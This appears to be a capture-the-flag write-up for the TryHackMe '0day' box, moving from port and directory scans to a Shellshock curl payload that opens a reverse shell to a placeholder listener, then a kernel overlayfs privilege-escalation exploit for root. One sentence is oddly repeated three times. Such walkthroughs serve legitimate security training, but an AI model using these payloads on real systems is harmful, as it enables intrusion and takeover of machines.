# [0day](https://tryhackme.com/room/0day)

First as usual, `nmap`.

```
# Nmap 7.92 scan initiated Tue Dec  7 15:07:13 2021 as: nmap -vvv -p 22,80 -sCV -oA init 10.10.18.175
Nmap scan report for box.ip (10.10.18.175)
Host is up, received conn-refused (0.21s latency).
Scanned at 2021-12-07 15:07:14 +07 for 14s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAPcMQIfRe52VJuHcnjPyvMcVKYWsaPnADsmH+FR4OyR5lMSURXSzS15nxjcXEd3i9jk14amEDTZr1zsapV1Ke2Of/n6V5KYoB7p7w0HnFuMriUSWStmwRZCjkO/LQJkMgrlz1zVjrDEANm3fwjg0I7Ht1/gOeZYEtIl9DRqRzc1ZAAAAFQChwhLtInglVHlWwgAYbni33wUAfwAAAIAcFv6QZL7T2NzBsBuq0RtlFux0SAPYY2l+PwHZQMtRYko94NUv/XUaSN9dPrVKdbDk4ZeTHWO5H6P0t8LruN/18iPqvz0OKHQCgc50zE0pTDTS+GdO4kp3CBSumqsYc4nZsK+lyuUmeEPGKmcU6zlT03oARnYA6wozFZggJCUG4QAAAIBQKMkRtPhl3pXLhXzzlSJsbmwY6bNRTbJebGBx6VNSV3imwPXLR8VYEmw3O2Zpdei6qQlt6f2S3GaSSUBXe78h000/JdckRk6A73LFUxSYdXl1wCiz0TltSogHGYV9CxHDUHAvfIs5QwRAYVkmMe2H+HSBc3tKeHJEECNkqM2Qiw==
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwY8CfRqdJ+C17QnSu2hTDhmFODmq1UTBu3ctj47tH/uBpRBCTvput1+++BhyvexQbNZ6zKL1MeDq0bVAGlWZrHdw73LCSA1e6GrGieXnbLbuRm3bfdBWc4CGPItmRHzw5dc2MwO492ps0B7vdxz3N38aUbbvcNOmNJjEWsS86E25LIvCqY3txD+Qrv8+W+Hqi9ysbeitb5MNwd/4iy21qwtagdi1DMjuo0dckzvcYqZCT7DaToBTT77Jlxj23mlbDAcSrb4uVCE538BGyiQ2wgXYhXpGKdtpnJEhSYISd7dqm6pnEkJXSwoDnSbUiMCT+ya7yhcNYW3SKYxUTQzIV
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKF5YbiHxYqQ7XbHoh600yn8M69wYPnLVAb4lEASOGH6l7+irKU5qraViqgVR06I8kRznLAOw6bqO2EqB8EBx+E=
|   256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIItaO2Q/3nOu5T16taNBbx5NqcWNAbOkTZHD2TB1FcVg
80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: 0day
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec  7 15:07:28 2021 -- 1 IP address (1 host up) scanned in 14.84 seconds
```

We just have 0day's personal page on port 80. I then ran `gobuster`.

```sh
$ gobuster dir -u http://box.ip/ -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -r -t 100 -o _

/cgi-bin              (Status: 403) [Size: 281]
/img                  (Status: 200) [Size: 928]
/uploads              (Status: 200) [Size: 0]
/admin                (Status: 200) [Size: 0]
/css                  (Status: 200) [Size: 922]
/js                   (Status: 200) [Size: 921]
/backup               (Status: 200) [Size: 1767]
/secret               (Status: 200) [Size: 109]
/server-status        (Status: 403) [Size: 286]
```

The `/backup/` page looks like an SSH key which we save for later usage. I also ran `gobuster` on `/secret/` but got no result.` I also ran `gobuster` on `/secret/` but got no result.` I also ran `gobuster` on `/secret/` but got no result.

I then ran `nikto` on the site.

```sh
$ nikto -host http://box.ip/ -output `pwd`/nikto.txt

- Nikto v2.1.6/2.1.5
+ Target Host: box.ip
+ Target Port: 80
+ GET Server leaks inodes via ETags, header found with file /, fields: 0xbd1 0x5ae57bb9a1192
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OPTIONS Allowed HTTP Methods: OPTIONS, GET, HEAD, POST
+ GET Uncommon header 'nikto-added-cve-2014-6278' found, with contents: true
+ OSVDB-112004: GET /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (CVE-2014-6271).
+ OSVDB-112004: GET /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (CVE-2014-6278).
+ OSVDB-3092: GET /admin/: This might be interesting...
+ OSVDB-3092: GET /backup/: This might be interesting...
+ OSVDB-3268: GET /img/: Directory indexing found.
+ OSVDB-3092: GET /img/: This might be interesting...
+ OSVDB-3092: GET /secret/: This might be interesting...
+ OSVDB-3092: GET /cgi-bin/test.cgi: This might be interesting...
+ OSVDB-3233: GET /icons/README: Apache default file found.
+ GET /admin/index.html: Admin login page/section found.
```

The most interesting thing here is that we seem to have "shellshock" at `/cgi-bin/test.cgi`. Following the examples on [hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-web/cgi#shellshock), I set up a listener and used `curl` to get a reverse shell.

```sh
$ curl http://box.ip/cgi-bin/test.cgi -A "() { :; }; /bin/bash -c 'exec bash -i &>/dev/tcp/LHOST/1337 <&1'"
```

With that, we should have a shell as `www-data`.

Checking the OS and kernel information ...

```sh
$ uname -r
3.13.0-32-generic

$ cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.1 LTS"

$ cat /etc/os-release
NAME="Ubuntu"
VERSION="14.04.1 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.1 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
```

We see that the machine is Ubuntu 14.04.1 LTS with the kernel version `3.13.0-32-generic`. Looking for exploits ...

```sh
$ searchsploit ubuntu 14.04 privilege escalation
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path
------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Priv | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Priv | linux/local/37293.txt
[snip]
```

We see an exploit for our Ubuntu and kernel versions. We then upload the C exploit to the target machine and compile it.

```sh
www-data@ubuntu:/tmp/ex$ gcc 37292.c
gcc: error trying to exec 'cc1': execvp: No such file or directory
```

This happens because the `PATH` variable is a bit wonky.

```sh
www-data@ubuntu:/tmp/ex$ echo $PATH
/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.
```

We can easily fix this by exporting [Ubuntu's default `PATH`](https://askubuntu.com/a/386636).

```sh
$ export PATH=/usr/sbin:/usr/bin:/sbin:/bin
```

With that, we should be able to compile and execute the exploit.

```sh
$ gcc 37292.c
$ ./a.out
```

We should then get a shell as root.
